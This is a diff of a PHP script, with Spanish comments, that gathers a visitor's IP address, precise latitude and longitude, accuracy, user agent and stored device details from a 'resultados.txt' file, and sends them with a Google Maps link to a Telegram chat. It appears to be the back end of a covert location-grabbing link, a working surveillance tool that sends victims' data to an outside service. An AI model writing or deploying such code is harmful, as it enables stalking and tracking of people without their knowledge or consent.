@@ -23,6 +23,7 @@ $ip = get_client_ip();
 $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
 $ts = gmdate('c');
 
+// --- Construir mensaje principal ---
 $msg = "📍 <b>Nueva ubicación</b>\n";
 
 if (!empty($ip)) $msg .= "🌐 IP: $ip\n";
@@ -31,17 +32,23 @@ if (!empty($lon)) $msg .= "📌 Lon: $lon\n";
 if (!empty($acc)) $msg .= "🎯 Precisión: {$acc}m\n";
 if (!empty($ua)) $msg .= "🖥️ UA: $ua\n";
 
-if (!empty($device['platform'])) $msg .= "💻 Plataforma: {$device['platform']}\n";
-if (!empty($device['architecture'])) $msg .= "🖥️ Arquitectura: {$device['architecture']}\n";
-if (!empty($device['cores'])) $msg .= "🧠 Núcleos: {$device['cores']}\n";
-if (!empty($device['memory'])) $msg .= "💾 Memoria: {$device['memory']} GB\n";
-if (isset($device['batteryLevel'])) $msg .= "🔋 Batería: {$device['batteryLevel']}\n";
-if (isset($device['charging'])) $msg .= "⚡ Cargando: " . ($device['charging'] ? 'Sí' : 'No') . "\n";
+// --- Leer datos guardados del archivo resultados.txt ---
+$file = __DIR__ . "/resultados.txt";
+if (file_exists($file)) {
+    $extra_info = file_get_contents($file);
+    if (!empty($extra_info)) {
+        $msg .= "\n📝 <b>Info previa del dispositivo</b>\n";
+        $msg .= trim($extra_info) . "\n";
+    }
+}
 
 $msg .= "⏰ Hora: $ts\n";
 
-if (!empty($lat) && !empty($lon)) $msg .= "🌍 Google Maps: https://www.google.com/maps?q={$lat},{$lon}\n";
+if (!empty($lat) && !empty($lon)) {
+    $msg .= "🌍 Google Maps: https://www.google.com/maps?q={$lat},{$lon}\n";
+}
 
+// --- Enviar a Telegram ---
 send_to_telegram($msg);
 
 echo json_encode(['status' => 'logged', 'timestamp' => $ts]);
